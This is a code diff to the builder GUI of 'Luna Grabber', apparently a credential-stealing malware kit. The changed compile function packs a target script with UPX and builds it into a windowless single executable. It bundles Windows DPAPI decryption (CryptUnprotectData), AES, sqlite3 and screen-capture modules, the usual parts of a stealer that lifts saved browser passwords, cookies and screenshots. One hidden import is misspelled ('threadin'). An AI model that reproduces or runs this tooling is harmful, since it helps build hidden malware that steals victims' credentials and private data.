@@ -30,7 +30,6 @@ class App(customtkinter.CTk):
 
         self.title("Luna Grabber Builder")
         self.geometry("1000x550")
-        self.iconbitmap(r"./gui_images/luna.ico")
 
         # set grid layout 1x2
         self.grid_rowconfigure(0, weight=1)
@@ -47,6 +46,7 @@ class App(customtkinter.CTk):
         self.help_image = customtkinter.CTkImage(dark_image=Image.open(os.path.join(image_path, "help.png")), size=(20, 20))
         self.font = "Supernova"
         self.iconpath = None
+        self.iconbitmap(f"{image_path}luna.ico")
 
         self.navigation_frame = customtkinter.CTkFrame(self, corner_radius=0)
         self.navigation_frame.grid(row=0, column=0, sticky="nsew")
@@ -420,12 +420,15 @@ class App(customtkinter.CTk):
 
     @catcher
     def compile_file(self, filename):
+        os.system("python ./tools/upx.py")
+
         if self.iconpath is None:
             exeicon = "NONE"
         else:
             exeicon = self.iconpath
 
-        os.system(f"python -m PyInstaller --onefile --clean --noconsole --upx-dir=./tools --distpath ./ --hidden-import base64 --hidden-import ctypes --hidden-import json --hidden-import re --hidden-import time --hidden-import subprocess --hidden-import sys --hidden-import sqlite3 --hidden-import requests_toolbelt --hidden-import threading --hidden-import shutil.copy2 --hidden-import argv --hidden-import zipfile.ZIP_DEFLATED --hidden-import zipfile.ZipFile --hidden-import psutil --hidden-import PIL --hidden-import PIL.ImageGrab --hidden-import Crypto --hidden-import Crypto.Cipher.AES --hidden-import win32crypt --hidden-import win32crypt.CryptUnprotectData --icon {exeicon} .\\{filename}.py")
+        os.system(
+            f'''python -m PyInstaller --onefile --clean --noconsole --upx-dir=./tools --distpath ./ --hidden-import base64 --hidden-import ctypes --hidden-import json --hidden-import re --hidden-import time --hidden-import subprocess --hidden-import sys --hidden-import sqlite3 --hidden-import requests_toolbelt --hidden-import threadin --hidden-import psutil --hidden-import PIL --hidden-import PIL.ImageGrab --hidden-import Crypto --hidden-import Crypto.Cipher.AES --hidden-import win32crypt --icon {exeicon} .\\{filename}.py''')
 
 
     def cleanup_files(self, filename):
